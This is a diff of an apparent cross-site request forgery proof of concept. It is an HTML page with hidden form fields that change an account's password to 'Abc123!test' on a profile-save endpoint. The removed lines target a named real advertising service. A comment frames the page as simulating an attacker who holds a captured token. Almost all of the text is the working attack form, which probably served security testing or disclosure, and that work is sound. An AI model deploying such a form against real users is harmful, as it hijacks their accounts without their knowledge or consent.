@@ -9,9 +9,9 @@
     Replace TOKEN_HERE with the CSRF token value if you captured one.
     This simulates an attacker who somehow learned the token (or victim reused token).
   -->
-  <form method="POST" action="https://advertiser.trafficjunky.com/member/profile/save-account" >
+  <form method="POST" action="/profile/save-account" >
     <input type="hidden" name="_token" value="TOKEN_HERE">
-    <input type="hidden" name="_currentUrl" value="http://advertiser.trafficjunky.com/my-profile-account">
+    <input type="hidden" name="_currentUrl" value="">
     <input type="hidden" name="old_password" value="">
     <input type="hidden" name="new_password" value="Abc123!test">
     <input type="hidden" name="new_password_confirmation" value="Abc123!test">
@@ -28,3 +28,4 @@
   </form>
 </body>
 </html>
+
